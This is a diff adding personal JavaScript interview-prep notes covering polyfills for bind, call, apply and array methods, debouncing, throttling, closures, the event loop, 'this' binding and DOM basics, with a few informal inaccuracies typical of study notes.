@@ -1,0 +1,3578 @@
+OOP in JS - https://slides.com/arfatsalman/oop-in-js
+DOM - https://slides.com/arfatsalman/dom
+Prototypes - https://slides.com/arfatsalman/deck-dbf3f3
+
+rm -rf .parcel-cache (to remove cache)
+
+utsav
+. functional programming
+			*		Functional programming is the process of building software by constructing pure functions.
+			*		Where we use method chaining.
+			.		Functional programming is declarative rather than imperative.
+
+. post vs get (when server state changes then we use post)
+
+. res
+	setData(e=>{return{…e, day: res.dayWise.map(each=>each.value)}})
+	setData(e=>{return{…e, week: res.weekWise.map(each=>each.value)}})
+
+.	Convert float to integer	
+		let x = 4.67;
+		let z = x | 0;
+		console.log(z); => 4
+
+
+.	aync vs defer
+		. With simple script tag the html parsing starts and when script tag is encountered then html parsing stops and
+			script get fetched and then execute after that html parsing continue.
+		.	With aync the html parsing starts and script with async tag gets fetched parallel when fetching is done then
+			html parsing stops and scripts gets execute and then html parsing continue. But when our script are dependent 
+			on each other then we should not use 'async'.
+		.	With defer html parsing starts and scripts with defer are gets fetched in parallel then after html parsing 
+			complete then only scripts get execute.
+
+
+Q-	ES6 Features
+				Destructuring
+				Arrow functions
+				Template literals
+				Promises
+				Let and const
+				Spread operator
+				Default parameters
+				Classes
+				Modules 
+					.	Modules are the piece of a JavaScript code written in a file.
+					.	(we can export variables, functions, objects like export {fn})
+
+.		Flex-box
+			.	use for single dimension layouts
+			.	makes it easier to design flexible and responsive layout structure without using float or positioning.
+
+
+Shallow Copy vs Deep copy
+		.	Shallow copy: means that only the first level of the object is copied. Deeper levels are referenced.
+			Ex:- 	by spread operator
+						by Object.assign({}, obj);
+
+			After updating a property in the first level of the cloned objects, the original property is not updated.
+			After updating a property in a deeper level, the original property is also updated. 
+			This happens because, in this case, deeper levels are referenced, not copied.
+
+
+	.		Deep copy: means that all levels of the object are copied. This is a true copy of the object.
+			Ex:-	by JSON.parse(JSON.stringify(obj | arr));
+
+
+.	The Object.is() static method determines whether two values are the same value.
+			Object.is(0, -0)			// false
+			console.log(0 == -0) 	// true
+			console.log(0 === -0)	// true
+
+
+*	Browser does not understand scaling and rotation. (learned when developing image resizer in NCLC).
+
+
+Q => polyfill of valueOf()
+
+
+. 	create bind method yourself and polyfill :-
+
+		let name = {
+		  first: "Tarun",
+		  last: "Jangra"
+		}
+
+		let printName = function(city,state){
+		  console.log(this.first + " "+this.last+","+city+","+state);
+		}
+
+		Function.prototype.mybind = function(context={}, ...args){
+			if(typeof this !== 'function'){
+				throw new Error(this + "cannot be bound as it's not callable");
+			}
+			context.fn = this;
+			return function(...args2){
+			   context.fn(...args, ...args2);
+			}
+		}
+
+		let printMyName2 = printName.mybind(name,"Rewari");
+		printMyName2("Haryana");
+
+
+.	call() polyfill =>
+		
+		let car = {
+		  color: 'Red',
+		  company: 'Ferrari'
+		};
+
+		function purchaseCar(currency, price){
+		  console.log(`I have purchased ${this.color} - ${this.company} car for ${currency} ${price}`);
+		}
+
+		Function.prototype.myCall = function(context={}, ...args){
+		  if(typeof this !== 'function'){
+		    throw new Error(this + "It's not callable");
+		  }
+		  context.fn = this;
+		  context.fn(...args);
+		}
+
+		purchaseCar.myCall(car, "$", 5000000);
+
+
+
+.	apply() polyfill =>
+
+		let car = {
+		  color: 'Red',
+		  company: 'Ferrari'
+		};
+
+		function purchaseCar(currency, price){
+		  console.log(`I have purchased ${this.color} - ${this.company} car for ${currency} ${price}`);
+		};
+
+		Function.prototype.myApply = function(context={}, argsArray){
+		  if(typeof this !== 'function'){
+		    throw new Error(this + "It's not callable");
+		  }
+
+		  if(!Array.isArray(argsArray)){
+		  	throw new TypeError("CreateListFromArrayLike called on non-object");
+		  }
+
+		  context.fn = this;
+		  context.fn(...argsArray);
+		};
+
+		purchaseCar.myApply(car, ["$", 5000000]);
+
+
+.	map polyfill =>
+
+		let a = [1,2,3,4,5];
+		console.log(a.map((each)=>{
+		  return each*10;
+		}))
+
+		Array.prototype.map = null;
+
+		if(!Array.prototype.map){
+		  	Array.prototype.map = function(callback){
+			    let arr = [];
+			    for(let x of this){
+			      arr.push(callback(x));
+			    }
+			    return arr;
+		  	}
+		}
+
+		console.log(a.map((val)=>{
+		  return val * 2;
+		}))
+
+
+.	forEach polyfill =>
+		const arr = [1,2,3,4,5];
+		arr.forEach((each)=>{
+		  console.log(each*10);
+		})
+
+		Array.prototype.forEach = null;
+
+		Array.prototype.forEach = function(cb){
+		  let a = this;
+		  for(let i=0;i<a.length;i++){
+		    cb(this[i]);
+		  }
+		}
+
+		arr.forEach((val)=>{
+		  console.log(val*2);
+		})
+
+
+.	filter polyfill =>
+		const arr = [1,2,3,4,5];
+		console.log(arr.filter((each)=>{
+		  return each>3;
+		}))
+
+		Array.prototype.filter = null;
+
+		Array.prototype.filter = function(cb){
+		  let a = this;
+		  let res = [];
+		  for(let i=0;i<a.length;i++){
+		    let flag = cb(a[i]);
+		    if(flag){
+		      res.push(a[i]);
+		    }
+		  }
+		  return res;
+		}
+
+		console.log(arr.filter((val)=>{
+		  return val%2==0 && val;
+		}))
+
+
+.	reduce polyfill =>
+		const arr = [1,2,3,4,5];
+		console.log(arr.reduce((acc,curr)=>{
+		  return acc+curr+"";
+		},''));
+
+		Array.prototype.reduce = null;
+
+		Array.prototype.myReduce = function(cb,defaultAcc){
+		  let res = defaultAcc;
+		  for(let i=0;i<this.length;i++){
+		    res = cb(res, this[i], i, this);
+		  }
+		  return res;
+		}
+
+		console.log(arr.myReduce((acc, val, index, arr)=>{
+		  return acc + val;
+		},''))
+
+.	Debouncing polyfill	=>
+
+		let getData = (a) =>{
+			console.log("fetching data....",a);
+		}
+
+		function debouncing(fn, debounceTime){
+	    let timer;
+			return function(args){
+				let context = this;
+		    clearTimeout(timer);
+				timer = setTimeout(()=>{
+					fn.apply(context, args);
+				}, debounceTime)
+			}
+		}
+
+		const callDebounceApi = debouncing(getData, 1000);
+
+		function btnClicked() {
+      		callDebounceApi([20]);
+    	}
+
+
+.	var count = 0;
+
+    const myDebounce = (cb, debounceTime) => {
+      let timer;
+      return function (...args) {
+        clearTimeout(timer);
+        timer = setTimeout(() => {
+          cb(...args);
+        }, debounceTime);
+      };
+    };
+
+    let debounceFn = myDebounce(() => {
+      count++;
+      console.log(count);
+    }, 2000);
+
+    function btnClicked() {
+      debounceFn();
+    }
+
+
+
+
+.	Throttling polyfill =>
+
+*		function getData() {
+		  console.log("called");
+		}
+
+		function throttle(fn, debounceTime) {
+		  let timer;
+		  return function (...args) {
+		    let context = this;
+		    if (!timer) { // untill timer not goes null or undefined don't call fn or setTimeout
+		      fn.apply(context, args);
+		      timer = setTimeout(() => {
+		        timer = null;
+		      }, debounceTime);
+		    }
+		  };
+		}
+
+		const throttledGetData = throttle(getData, 500);
+		throttledGetData();
+
+
+.		const expensive = () => {
+	      console.log("Expensive");
+	    };
+
+	    const throttle = (fn, limit) => {
+	      let flag = true;
+	      return function (...args) {
+	        let context = this;
+	        if (flag) {
+	          fn.apply(context, args);
+	          flag = false;
+	          setTimeout(() => {
+	            flag = true;
+	          }, limit);
+	        }
+	      };
+	    };
+
+	    let betterThrottle = throttle(expensive, 1000);
+
+		function btnClicked() {
+		  betterThrottle();
+		}
+
+
+
+	   
+.	    var count = 0;
+
+	    const myThrottle = (cb, d) => {
+	      let last = 0;
+	      return function (...args) {
+	        let now = new Date().getTime();
+	        if (now - last < d) {
+	          return;
+	        }
+	        last = now;
+	        return cb(...args);
+	      };
+	    };
+
+	    let throttleFn = myThrottle(() => {
+	      count++;
+	      console.log(count);
+	    }, 2000);
+
+	    function btnClicked() {
+	      throttleFn();
+	    }
+
+
+.	Array.find() Polyfill:-
+
+		if(!Array.prototype.find){
+		  Array.prototype.find = function(callback, thisArg){
+		    if(this == null){
+		      throw new TypeError("null or undefined");
+		    }
+		    
+		    if(typeof callback !== 'function'){
+		      throw new TypeError('Callback must be a function');
+		    }
+		    
+		    var list = Object(this);
+		    var length = list.length >>> 0;
+		    
+		    for(var i=0;i<length;i++){
+		      if(callback.call(thisArg, list[i], i, list)){ // check this line
+		        return list[i];
+		      }
+		    }
+		    
+		    return undefined;
+		  }
+		}
+
+
+.	findLastIndex()
+
+
+*	Promise Polyfill =>
+
+
+*	Array.from()
+
+
+.	Library vs Framework =>
+		Both libraries and frameworks are reusable code written by someone else. 
+		The technical difference between a framework and library lies in a term called inversion of control.
+		When you use a library, you are in charge of the flow of the application. 
+		You are choosing when and where to call the library. When you use a framework, 
+		the framework is in charge of the flow. It provides some places for you to plug in your code, 
+		but it calls the code you plugged in as needed.
+		Their purpose is to help you solve common problems in easier ways.
+
+
+.	append() vs appendChild() =>
+		const parent = document.createElement('div');
+		const child = document.createElement('p');
+
+		parent.append(child); 			// Works fine
+		parent.appendChild(child); 		// Works fine
+
+		parent.append('Hello world'); 			// Works fine
+		parent.appendChild('Hello world'); 		// Throws error
+
+
+https://codesandbox.io/s/quiz-pure-dom-l0k8x?file=/src/index.js:4889-4906
+
+.	Execution context:-
+				.	When the JavaScript engine scans a script file, it makes an environment called the 
+					Execution Context that handles the entire transformation and execution of the code.
+				.	During the context runtime, the parser parses the source code and allocates memory 
+					for the variables and functions. The source code is generated and gets executed.
+
+					Types of execution contexts: global and function context.
+						Global context are the ones which will be created when the main code block getting executed. 
+						Function context are the ones created by the functions inside the code block.
+
+					Also there is a concept of Call stack which works on the principal of LIFO which helps in code execution.
+
+				.	Execution context has two parts:-
+						Memory section and Code section. In memory section all the variables placed and get assigned a val. 
+						In code section our functions gets execute. Every functions creates a small Execution context.
+
+
+.	global execution name is anonymous.
+
+.	all execution context move to call stack.
+
+.	var always hoist in global and method scope.
+
+.	let & const =>
+				. hoisting doesn't apply on these varaibles.
+				.	they are not present in window object but in the temporal dead zone.	(if declared in global scope)
+				. temporal dead zone is time from declaring a varaible to assigning the value to let & const.
+				.	they cannot be accessed by window.a
+				.	cannot create another variable with same name.  (cannot redeclared)
+				. can update a constant array
+				.	can update a constant object
+				.	But you can NOT reassign the object:
+					Example :-  const car = {type:"Fiat", model:"500", color:"white"};
+								car = {type:"Volvo", model:"EX60", color:"red"};
+
+.	we cannot shadow let & const by var also
+									eg:-	const,let a = 10; 
+											{
+												var b = 20; 
+											}
+
+
+*		(function(){ 
+			var a = b = 10; 
+		})(); 
+		console.log(b);			// 10  (bcz we not specify type of b so it will be created at global level with value 10)
+
+.	const => can only be initialized at the time of initialization
+
+.	block => group of multiple statements where js expect a single statement.
+
+.	shadowing => let cannot be shadowed by using var.
+
+.	scope are same for normal function and arrow function.
+
+**	We can't change context of an arrow function by using call(), bind(), apply().
+
+.	this =>	this keyword refers to the object that is currently executing the code.
+
+	.		function x(){
+				console.log(this);	// window
+				function y(){
+					console.log(this);  // window
+					function z(){
+						console.log(this);  // window
+					}
+					z();
+				}
+				y();
+			}
+
+			x();
+
+	*		const user = {
+			  "firstName": "Tarun",
+			  "lastName": "Jangra",
+			 	"hobbies": ["gaming","coding"],
+			  "listHobbies": function(){
+			    this.hobbies.forEach(function(hobby){		//everything working according to this function
+			   	  console.log(this);						//// its not referring to anything so by default this is window.
+			      console.log(this.firstName);				//// undefined bcz this function has a new context.
+			    })									// but we can pass this in forEach as second arg
+			  }
+			}
+
+			user.listHobbies();
+
+*	we can pass this in forEach as second arg.
+
+
+.	"this" in array function is enclosing lexical context.
+
+.	this inside DOM is refrence to the HTML element from where our function get called.
+		<button onclick="alert(this)"> Click Me! </button>
+
+
+	.		const user = {
+			  "firstName": "Tarun",
+			  "lastName": "Jangra",
+			  "hobbies": ["gaming","coding"],
+			  "listHobbies": function(){
+			    console.log(this)
+			    this.hobbies.forEach((hobby) => {		// here we are using arrow function so it will have it's parents context
+			      console.log(this);
+			      console.log(this.firstName);
+			    })
+			  }
+			}
+
+			user.listHobbies();
+
+
+	.		const person = {
+			  name: "Tarun",
+			  print: function(){
+			    console.log(this);
+			  }
+			}
+
+			const person2 = {
+			  name: "utsav"
+			}
+
+			person.print();							// object person
+			person.print.call();				// window
+			person.print.call(this);		// window
+			person.print.call(person2);	// object person2
+
+
+	.		const obj = {
+			  name: "Tarun",
+			  print: function(){
+			    console.log(this.name);
+			  },
+			  print2: ()=>{
+			    console.log(this.name);
+			  },
+			}
+
+			obj.print();
+			obj.print2();
+
+
+**		let a = {
+			}
+
+			console.log(a + 1); // any primitive operation will automatically call valueOf()
+													// so object.valueOf() will return "[object Object]"
+
+.	Prototype of an Object
+			Prototypes are the mechanism by which JavaScript objects inherit properties and methods from one another.
+
+
+.	Prototype chain
+			Every object in JavaScript has a built-in property, which is called its prototype. The prototype is itself 
+			an object, so the prototype will have its own prototype, making what's called a prototype chain. 
+			The chain ends when we reach a prototype that has null for its own prototype.
+
+
+.	innerText vs textContent vs innerHtml
+		textContents is all text contained by an element and all its children that are for formatting purposes only.
+		innerText returns all text contained by an element and all its child elements.
+		innerHtml returns all text, including html tags, that is contained by an element.
+
+		Ex:-
+			<div id="mylinks">
+			  This is my <b>link collection</b> : 
+			  <ul>
+			    <li><a href="www.borland.com">Bye bye <b>Borland</b> </a></li>
+			    <li><a href="www.microfocus.com">Welcome to <b>Micro Focus</b></a></li>
+			  </ul>
+			</div>
+
+			.	This is my link collection :						(textContent)
+
+			.	This is my link collection : Bye bye Borland Welcome to Micro Focus 		(innerText)
+
+			.	This is my <b>link collection</b>: 															(innerHtml)
+				<ul> 
+				  <li><a href="www.borland.com">Bye bye <b>Borland</b></a></li>
+				  <li><a href="www.microfocus.com">Welcome to <b>Micro Focus</b></a></li> 
+				</ul>
+	
+.	closure => 
+			.	function along with its lexical scope form a closure.
+			.	it consume more memory bcz some unused variable cannot be accessed by garbageCollector.
+
+			Advantage:-
+					Encapsulation
+					Data Privacy:-
+						Closures allow us to create private variables & functions that are hidden from the global scope. 
+
+			Applications :-
+					Currying
+					HOF -> Memoize
+					setTimeouts
+					Module design pattern
+
+
+.	garbageCollector :- Free up the memory if variable is unreachable or not going to use in future.
+			Ex:- 	function a(){
+							var x = 0;
+							var z = 10;
+							return function b(){ // when we reach this line now there is no future use of z so it will be GC.
+								console.log(x);
+							}
+						}
+
+						var y = a();
+
+
+.	Mark and sweep algorithm:-
+		This algorithm assumes the knowledge of a set of objects called roots. The root is the global object. 
+		The garbage collector will start from these roots, find all objects that are referenced from these roots. 
+		The garbage collector will start from root and find all reachable objects and collect all non-reachable objects.
+
+
+.	scope chain => 	if a function not able to find any vaiables value then it goes to it parent laxical scope to check
+								 	if it not present there also then it goes to parent of parent. This is know as scope chain.
+
+.	Event loop :- 	
+					JS is an synchronous language in which task execute line by line but if there is any
+					async task then it goes to callback queue and after execution of all lines then 
+					event loop comes in the picture. Event loop is just like a gatekeeper.
+					It goes to callback queue to search is there any task present or not then 
+					these tasks will be transfered to call stack and start execute one by one in 
+					which order they were written.
+					Event loop is a core mechanism that enables asynchronous, non-blocking behavior in JS.
+
+.	task queue is used for synchronous statements
+
+.	Micro-task and Macro-task queue(Callback queue) :-
+					An Event Loop in JavaScript is said to be a constantly running process that keeps an eye
+					on the call stack. Its main function is to check whether the call stack is empty or not. 
+					If the call stack turns out to be empty, the event loop proceeds to execute all the callbacks
+					waiting in the task queue. The tasks are broadly classified into two categories:- 
+					namely 'micro-tasks' and 'macro-tasks'.
+
+					Micro-task :- A micro-task is said to be a function that is executed after the JavaScript 
+												execution stack is empty. Micro-tasks include mutation observer callbacks
+												and promise callbacks.
+
+					Macro-task :- A macro-task is said to be a function that is executed after the micro-task
+												queue is empty. The macro-task queue works the same as the task queue. 
+												The small difference between the two is that the task queue is used for synchronous 
+												statements whereas the macro-task queue is used for asynchronous statements.
+
+
+					Ex:-	const p = new Promise((resolve, reject)=>{
+								  setTimeout(()=>{
+								    resolve("Success");
+								  },3000)
+								})
+
+								setTimeout(()=>{
+								  console.log("hello");	// print last
+								},3000);
+
+								p.then((res)=>{
+								  console.log(res);	// print first
+								})
+
+
+.	Lexical environment:-
+			When javascript engine creates a new execution context for a function, it creates a new lexical 
+			environment to store variables defined in that function during the execution phase.
+			A lexical Environment is a data structure that holds an identifier-variable mapping.
+
+			The lexical environment contains two components:
+					.	Environment record:-
+							It is the actual place where the variable and function declarations are stored.
+
+					.	Reference to the outer environment:-
+							It means it has access to its parent lexical environment.
+
+
+.	Block / Compound statement:-
+		Its a collection of statement in js enclosed within braces {}.
+
+.	Why are block statement required ?
+		let and const declarations are scoped to the containing block. This allows us to hide data 
+		from the global scope without wrapping it in a function. It helps in abstraction.
+
+
+.	Expression vs (Statement/Declaraction) =>
+		An expression is a bit of JavaScript code that returns a value.
+		ex:-	1 → produces 1
+					"hello" → produces "hello"
+					5 * 10 → produces 50
+					num > 100 → produces either true or false
+					isHappy ? "🙂" : "🙁" → produces an emoji
+					[1, 2, 3].pop() → produces the number 3
+
+
+		A JavaScript program is a sequence of statements. Each statement is an instruction for the computer to do something.
+		ex:- 	.	if (hi > 10) {
+						  // More statements here
+						}
+					.	throw new Error('Something exploded!');
+					.	let hi = 5;
+
+					Here's how I like to think about this: statements are the rigid structure 
+					that holds our program together, while expressions fill in the details.
+					Statements often have "slots" for expressions. We can put any expression we like into those slots.
+					For example, declaring a variable has an expression slot:
+						let hi = /* some expression */;
+
+.	functions => 
+			1.	normal function :- (full function hoisted)
+
+			2.	function expression :- (only var type variable is hoisted but before initialization we cant access them)
+
+			3.	anonymous function :- only for execute one time and are be used as values.
+
+			4. 	named function expression => only be accessed 
+
+
+.	First class Function / First class Citizens => 
+						.	ability of a function can be passed as args, used as values and can be return is known as FCF.
+
+
+.	callback functions => 
+					.	A callback function is a function passed into another function as an argument.
+					.	that callbacks are often used to continue code execution after an asynchronous 
+						operation has completed — these are called asynchronous callbacks.
+					Ex:- setTimeout
+
+
+.	higher-order-function => 
+						.	those functions which take function as an argument or return a function or sometimes both.	
+							eg :- map()
+
+							
+. pure function => 	
+					A function that does not have any side-effects and always returns the same result for same input.
+					Ex:- .map()
+
+						const arr = [1,2,3];
+
+						function addEleToArr(a, element){
+							return [...a, element];
+						}
+
+						addEleToArr(a, 5);
+
+
+
+.	Unpure Function => 	Math.random
+
+
+Q.	What is the arguments object
+A.	arguments is an array-like object accessible inside functions 
+		that contains the values of the arguments passed to that function.
+
+.	args vs params
+		function add(a, b) { // 'a' and 'b' are parameters
+		  return a + b;
+		}
+		const result = add(3, 5); // '3' and '5' are arguments passed to the function
+
+Q.	How to create an object without a prototype
+A.	Object.create(null)
+
+.	Class => 	It is a template for JavaScript objects.	A JavaScript class is not an object.
+						always add a method named constructor()
+
+
+.	Object.seal() vs Object.freeze()
+	seal() allows changes to the existing properties of an object. It prevents from deletion of 
+	existing properties but cannot prevent them from external changes. Object. freeze() does not allow so.
+
+
+.	Freeze a value of an object
+			const user = {
+			  name: "tarun",
+			  dob: "29-01-2000"
+			}
+
+			const propertyDescriptor = {
+			  value: user.dob,
+			  writable: false
+			}
+
+			Object.defineProperty(user, "dob", propertyDescriptor);
+
+			user.dob = "kjdsjflkas";
+
+			console.log(user);
+
+
+.	Diff between in and hasOwnProperty
+			The in operator will check if the property is present directly in an object or in its prototype chain. 
+			The hasOwnProperty() method only checks if the property is directly present in the object.
+
+			Ex:- 	let arr = [1];
+						console.log(arr.hasOwnProperty("0")); // true
+						console.log(arr.hasOwnProperty("map")); // false
+						console.log("map" in arr); // true'
+
+*	shift 
+		shift remove the first element of an array.
+
+*		unshift add elements in the beginning of array. (any no of elements)
+		array1.unshift(4, 5)
+
+.		Type coercion:-
+				As mentioned above, JavaScript is a weakly typed language. This means that you can often use a value 
+				of one type where another type is expected, then JS will convert it to the right type for you.
+
+.	Type conversion vs Type coercion
+
+.	What are the ways to deal with Asynchronous Code in JavasScript?
+		promise then/catch method chaining 
+		async/await 
+
+.	Symbol:-
+		Symbol is a built-in object whose constructor returns a symbol primitive. It is unique. 
+		Symbols are often used to add unique keys to an object that won't collide with other keys.
+
+			const a = Symbol("hello");
+			const b = Symbol("hello");
+
+			console.log(a==b);			// false
+			console.log(a===b);			// false
+
+
+.	Class vs Object
+		Class is just like a bueprint of an object that helps us to create objects and like bind data and their behaviour.
+		Object is a real world entity that has data and the function to work with those data.
+
+
+.	Async / Await
+		.	Async simply allows us to write promises-based code. It returns a new Promise.
+		. Await make a promise-returning functions behave as like they are synchronous by suspending 
+			execution until the promise is settled.
+		.	await just suspend the current function execution and allowing other code to run that is outside of async function.
+
+		Ex:-	const p1 = new Promise((resolve, reject)=>{
+					  setTimeout(()=>{
+					    resolve("api 1");
+					  },5000)
+					});
+
+					const p2 = new Promise((resolve, reject)=>{
+					  setTimeout(()=>{
+					    resolve("api 2");
+					  },2000)
+					});
+
+					*		async function handle1(){
+							  const val1 = await p1;
+							  console.log("val1 ",val1);
+							  
+							  const val2 = await p2;
+							  console.log("val2 ",val2);
+							}
+
+							handle1(); // both promise reolve after 5sec
+
+
+					*		async function handle2(){
+							  const val2 = await p2;
+							  console.log("val2 ",val2);
+							  
+							  const val1 = await p1;
+							  console.log("val1 ",val1);
+							}
+							handle2(); // val2 print after 2s and val1 after 3s of p1
+
+							console.log("Hello");
+
+
+
+.*	arrow => in arrow function this is of parent.
+		eg:- const obj = {
+			name: 'arfat',
+			printName: () =>{
+				console.log(this.name);		// undefined  (bcz this is equal to window.)
+			}
+		}	
+
+		obj.printName();
+
+
+.*	const obj = {
+			name: 'arfat',
+			printName() {
+				console.log(this.name);		// arfat
+			}
+		}	
+  
+  	obj.printName();	
+
+
+.*	const obj = {
+		  fname: "arfat",
+		  do(){
+		    const a = this;		// obj
+		    let printName = function(){
+		      console.log(this);			// window object
+		      console.log(this.fname);		// undefined
+		    }
+		    printName();		// bcz printName is called without any context.
+		  }
+		}
+
+		obj.do();
+
+
+.	const obj = {
+	  fname: "arfat",
+	  do(){
+	    const a = this;
+	    let printName = ()=>{
+	      console.log(this);			// object
+	      console.log(this.fname);		// arfat
+	    }
+	    printName();
+	  }
+	}
+
+	obj.do();
+
+
+.*	setTimeout(function (){
+	  console.log(this);		// can't say (bcz we can't see execution context)
+	}, 1000);
+
+
+.	deligation => if not find any property with that name then seacrh it in the parents
+
+.**	convert into binary => 
+							a.toString(2);
+
+
+.**	 To format a number to display only "four" decimal places
+			num.toFixed(4);
+
+.	reduce() =>		
+				.	arr.reduce(function(acc, curr){
+						logic;-----
+					}, defaultValueOfacc);
+
+
+			eg:-	const users = [
+					  {firstname: 'akshay', lastname: 'saini', age: 26},
+					  {firstname: 'donald', lastname: 'trump', age: 75},
+					  {firstname: 'elon', lastname: 'musk', age: 50},
+					  {firstname: 'deepika', lastname: 'padukone', age: 26},
+					];
+
+					const output = users.reduce((acc,curr)=>{
+					  if(curr.age < 30){
+					    acc.push(curr.firstname);
+					  }
+					  return acc;
+					},[]);
+
+					console.log(output);
+
+
+
+.	map() - filter() - reduce()  
+
+.	1.	array.filter((el) => el%2 == 1).map((el) => el*2);
+
+	2.	function isOdd(el){
+		    return el % 2 == 1;
+		}
+
+		function double(num){
+		    return num * 2;
+		}
+
+		function doubleOdd(array){
+		    return array.filter(isOdd).map(double);
+		}
+
+.	class & constructor =>	// here setter and getter are different from java.
+
+						eg:-class Car {
+							  constructor(brand) {
+							    this.carname = brand;
+							  }
+							  get cnam() {
+							    return this.carname;
+							  }
+							  set cnam(x) {
+							    this.carname = x;
+							  }
+							}
+
+							let myCar = new Car("Ford");
+							myCar.cnam = "Audi";
+							console.log(myCar.cnam)
+
+
+
+. 	Inheritance  =>	
+					class Car{
+					  constructor(){
+					    this.name = "tarun"
+					  }
+					  test(){
+					    return this.name;
+					  }
+					}
+
+					class Car1 extends Car{
+					  constructor(){
+					    super();
+					  }
+					  show(){
+					    return this.test()
+					  }
+					}
+
+					let c = new Car1();
+					console.log(c.show())
+
+.	Person.prototype  => it is an object
+
+.	Person.prototype.constructor  => it keeps a refrence of Person class.
+
+.	Prototype =>
+				.	Object.getPrototypeOf(obj);
+				.	Object.setPrototypeOf(obj, obj2);
+
+.	getPrototypeOf vs __proto__
+		getPrototypeOf is recommended
+
+.	Array.prototype.includesOneOf = function(array){
+	    const arr = this;
+	    for(const a of array){
+	        if(arr.includes(a)){
+	            return true;
+	        }
+	    }
+	    return false;
+	}
+
+	const arr=[1, 2, 3, 4, 5, 6];
+	console.log(arr.includesOneOf([2, 8, 10]));
+
+.	Object.entries(obj);
+
+.	Object.values(obj);
+
+. Object.keys(obj);
+
+* 	Array =>
+			const arr = ['arfat','salman'];
+
+			arr.myname = 'Tj';
+
+			console.log(arr.myname);	// Tj
+
+			arr.length;		// 2
+
+.	var arr = new Array(2);		// CREATE an array of length 2
+
+.	if(arr instanceof Array)	// bad practice
+
+.	if(Array.isArray(arr))		// tells if arr is an array or not.
+
+.	arr.includes(NaN);		// if present then return true
+
+.	arr.indexOf(NaN);		//	-1	(bad practice)
+
+.	if we use + operator with numerical string then it concatenate that numberic string.
+	eg:- true + '2' = true2
+		 '2' + '3' = 23
+
+.	if we use other operator with numeric string then they work as arithmatic operator.
+	eg:- '2' * '3' = 6
+
+.	'Bruce' - 'Wayne' = NaN
+	'5' - null = 5
+	'5' - undefined = NaN
+	'5' + true = 5true
+	'5' - true = 4
+	'5' - false = 5
+
+.	Number('') = 0
+
+.	toString() not work with null & undefined
+
+.	var arr = [3, 5, 7];
+	arr.foo = "hello";
+
+	for(let x in arr ){
+	  console.log(x)	=> "0" "1" "2" "foo"
+	}
+
+.	var arr = [3, 5, 7];
+	arr.foo = "hello";
+
+	for(let x of arr ){
+	  console.log(x)	=> 3 5 7
+	}
+
+.	var arr = [3, 5, 7];
+	arr.foo = "hello";
+
+	console.log(arr);  => [3, 5, 7]
+	
+.	findIndex(callback function())=>
+									const array1 = [5, 12, 8, 130, 44];
+
+									const isLargeNumber = (element) => element == 8;
+
+									console.log(array1.findIndex(isLargeNumber));
+
+. arr.sort();		// only for String
+
+.	arr.sort((a,b)=>a-b);	//	comparator
+
+.	arr.concat();		// merge two arrays [1,2,3], [4,5] -> [1,2,3,4,5]
+
+.	arr.join('-');
+	arr.join(',');
+
+.	arr.slice(0,3);		//	like substring
+
+.	const arr = [1,2,3,4,5,6,7,8];
+
+	const even = arr.filter(function(){
+			return el%2 == 0;
+		})
+
+.	Array.from(freqMap.values())	// create an array 
+
+.	str.indexOf()
+
+.	arr.indexOf()
+
+.	delete data from an array
+
+	let a = [1,2,3];
+	delete a[1];
+	console.log(a);	//	[1, undefined, 3] create an empty slot/hole'
+
+
+**	forEach => it always skips holes
+				const arr = [];
+				arr[0] = "Arfat";
+				arr[2] = "Salman";
+				arr.length;		// 2
+
+				arr.forEach((el){
+					console.log(el);	//	Arfat Salman
+				})
+
+.	let x = 10;
+	window.x;	// undefined
+
+.	DOM => 	Dom represent the logical structure of the web page. DOM represents the document as nodes and objects.
+					The Document Object Model is a Tree of "JavaScript object" of html nodes.
+					The HTML will convert into DOM object.
+
+
+.	BOM =>	The Browser Object Model (BOM) in JavaScript includes the properties and
+			methods for JavaScript to interact with the web browser.
+
+			BOM provides you with a window objects, for example, to show the width and
+			height of the window. 
+
+			All global JS objects, functions, and variables automatically become members of the window object.
+
+			It also includes the window.screen object to show the width and height of the screen.
+
+			eg:- setTimeout()  &  setInterval()
+
+.	What's the difference between event.preventDefault() and event.stopPropagation() methods
+			preventDefault() prevents the default browser behavior for a given element.
+			stopPropagation() stops an event from bubbling or propagating up the DOM tree.
+
+.	How to know if the event.preventDefault method was used in an element?
+			Use event.isDefaultPrevented() to check whether the preventDefault() method was called for the event.
+
+.	Difference between event.currentTarget and event.target
+			currentTarget tells us on which element the event was attached. 
+			event.target tells where the event started.
+
+*	What does the !! operator do?	(like toggling)
+			It does true or falsy conversion of the value.
+
+
+.	location =>
+				. 	pathname()
+				.	host()
+				. 	hostName()
+				.	search()
+				.	assign(url)
+				.	replace(url)
+				.	reload()
+
+.	setCustomValidity() =>
+							In an input element, it is used to set the validationMessage property. It is really very 
+							easy to control a custom validation message in an HTML5 form. Let us find out how.
+
+							eg :-	if (textbox.value === '') {
+						                textbox.setCustomValidity
+						                      ('Entering an email-id is necessary!');
+						            } else if (textbox.validity.typeMismatch) {
+						                textbox.setCustomValidity
+						                      ('Please enter an email address which is valid!');
+						            }
+
+
+.	validationMessage()	Contains the message a browser will display when the validity is false.
+
+.		.match() when you want to extract the matched parts of a string using a regular expression.
+
+.		.test() when you simply want to check if a pattern exists within a string.		// try to use this only
+
+.	window.open("https://www.w3schools.com");  => open new window
+
+.	event.keyCode();
+
+.	deltaX	=> use for mouse wheel rotation report.
+
+.	event.stopPropagation();
+
+.	event.preventDefault() => stop browser action and do mine.
+
+.	optionDiv.textContent = option;
+
+.	prompt.appendChild(document.createTextNode(questionPrompt));
+
+.	methods =>	define in an object				(this keyword refers to the owner object)
+
+.	function => define with function keyword	
+							(this refers to the global/owner object)
+
+
+.	in strict mode this is undefined
+
+.	if the value of this is null or undefined this keyword will be replaced with globalObject value. (But only in non-strict mode)
+		function x(){
+			console.log(this);	// window in non-strict mode
+		}
+
+		x();	// it is like window.x() in non-strict mode;
+
+
+.	bind() retrun a new function() and that object will permanent bind to this keyword.
+	eg:- .	function x(){
+			  console.log(this);
+			}
+
+			x();						// window
+			const y = x.bind({});
+			y();						// object
+
+
+
+		.let person = {
+		    name: 'John Doe',
+		    getName: function() {
+		        console.log(this.name);
+		    }
+		};
+
+		let f = person.getName.bind(person);
+		setTimeout(f, 1000);
+
+.	call({},10,20) not return a new function() and that object will bound to this keyword only  for that specific call.
+
+.	const person = {
+	  fullName: function(city, country) {
+	    return this.firstName + " " + this.lastName + "," + city + "," + country;
+	  }
+	}
+
+	const person1 = {
+	  firstName:"John",
+	  lastName: "Doe"
+	}
+
+	person.fullName.call(person1, "Oslo", "Norway");
+
